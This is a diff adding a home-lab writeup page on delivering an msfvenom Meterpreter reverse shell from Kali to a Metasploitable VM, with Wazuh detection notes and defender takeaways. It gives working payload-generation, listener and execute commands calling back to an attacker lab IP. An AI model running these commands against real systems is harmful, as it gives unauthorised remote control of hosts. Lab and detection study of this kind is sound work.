@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Reverse shell writeup: msfvenom payload delivery from Kali to Metasploitable, Wazuh FIM and outbound connection alerts, defender takeaways.">
+    <title>Reverse Shell Payload with msfvenom | jellybeansontoasties Home Lab</title>
+    <link rel="stylesheet" href="../assets/css/style.css">
+</head>
+<body>
+    <nav>
+        <ul>
+            <li><a href="../index.html">Home</a></li>
+            <li><a href="../about.html">About</a></li>
+            <li><a href="../lab-setup.html">Lab Setup</a></li>
+            <li><a href="writeup-01.html">Writeups</a></li>
+            <li><a href="https://github.com/Jellybeansontoasties">GitHub</a></li>
+        </ul>
+    </nav>
+
+    <main>
+        <h1>Reverse Shell Payload with msfvenom</h1>
+        <p class="tagline">Generate and deliver a Meterpreter reverse shell from Kali to Metasploitable</p>
+
+        <div class="writeup-section">
+            <h3>Objective</h3>
+            <p>Generate a reverse TCP payload with msfvenom, start a Metasploit listener on Kali, and deliver/execute the payload on the victim to obtain a Meterpreter session. This demonstrates post-access payload delivery and the value of FIM and network monitoring.</p>
+        </div>
+
+        <div class="writeup-section">
+            <h3>Tools used</h3>
+            <p>msfvenom, Metasploit multi/handler, netcat</p>
+        </div>
+
+        <div class="writeup-section">
+            <h3>Commands used</h3>
+            <p><strong>Step 1 — Generate payload:</strong></p>
+            <pre><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.100.10 LPORT=4444 -f elf > shell.elf</code></pre>
+            <p><strong>Step 2 — Start listener on Kali:</strong></p>
+            <pre><code>msfconsole -x 'use exploit/multi/handler; set LHOST 192.168.100.10; set LPORT 4444; run'</code></pre>
+            <p><strong>Step 3 — Deliver and execute on victim</strong> (e.g. upload shell.elf via SCP or existing shell, then <code>chmod +x shell.elf && ./shell.elf</code>).</p>
+        </div>
+
+        <div class="writeup-section">
+            <h3>Expected output</h3>
+            <div class="screenshot-placeholder">Screenshot: Meterpreter session opened, or listener receiving connection</div>
+        </div>
+
+        <div class="writeup-section">
+            <h3>Findings</h3>
+            <p>Session opened (placeholder): after execution on the victim, the Meterpreter handler received a connection and a session was established. This provides full interactive access from the attacker machine, demonstrating how a single malicious binary can grant remote control. Document session ID and any post-exploitation steps here.</p>
+        </div>
+
+        <div class="writeup-section">
+            <h3>Wazuh Alert</h3>
+            <p><strong>FIM alert</strong> — New binary or script created/executed (e.g. shell.elf). <strong>Outbound connection detected</strong> — the victim initiated a connection to the Kali host on the callback port (4444). Correlating FIM (new file) with outbound connections to unknown or lab IPs helps identify reverse shells and backdoors.</p>
+        </div>
+
+        <div class="writeup-section">
+            <h3>Defender Takeaway</h3>
+            <p>Monitor for new executables in sensitive paths (FIM) and for outbound connections to non-standard ports. IOCs for reverse shells: new ELF/binaries, outbound TCP to high or uncommon ports from servers. Restrict outbound connectivity where possible (e.g. egress filtering) and treat unexpected outbound connections as high priority. Ensure Wazuh (or equivalent) is monitoring file integrity and network/connection events.</p>
+        </div>
+
+        <nav class="writeup-nav">
+            <a href="writeup-02.html">← Previous: SSH Brute Force with Hydra</a>
+            <a href="writeup-04.html">Next: Privilege Escalation on Metasploitable →</a>
+        </nav>
+    </main>
+
+    <footer>
+        <p><a href="https://github.com/Jellybeansontoasties">GitHub</a> | Built on Arch Linux</p>
+    </footer>
+</body>
+</html>
